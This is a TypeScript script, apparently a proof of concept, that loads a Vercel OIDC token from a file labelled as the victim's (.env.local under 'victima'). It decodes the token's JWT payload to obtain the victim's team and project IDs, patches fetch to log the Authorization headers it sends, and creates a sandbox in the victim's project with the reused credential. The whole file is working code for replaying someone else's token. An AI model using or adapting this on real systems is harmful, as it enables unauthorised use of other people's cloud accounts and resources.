import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
console.log("token pasado:", VICTIM.slice(0, 40) + "...");

const origFetch = globalThis.fetch;
(globalThis as any).fetch = async (url: any, init: any) => {
  const auth = (init?.headers as any)?.authorization || (init?.headers as any)?.Authorization;
  if (url.toString().includes("/v2/sandboxes")) {
    console.log(">> fetch", init?.method || "GET", url.toString().replace(/https:\/\/vercel\.com/, ""));
    if (auth) {
      const t = String(auth).replace("Bearer ", "");
      console.log("   auth len:", t.length, "head:", t.slice(0, 40), "...tail:", t.slice(-20));
      console.log("   igual al pasado?", t === VICTIM);
    }
  }
  return origFetch(url as any, init as any);
};

async function main() {
  const s = await Sandbox.create({
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    resources: { vcpus: 1 }, name: "debug-v2", timeout: 5 * 60_000,
  });
  console.log("creada:", s.name, (s as any).session?.sessionId);
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });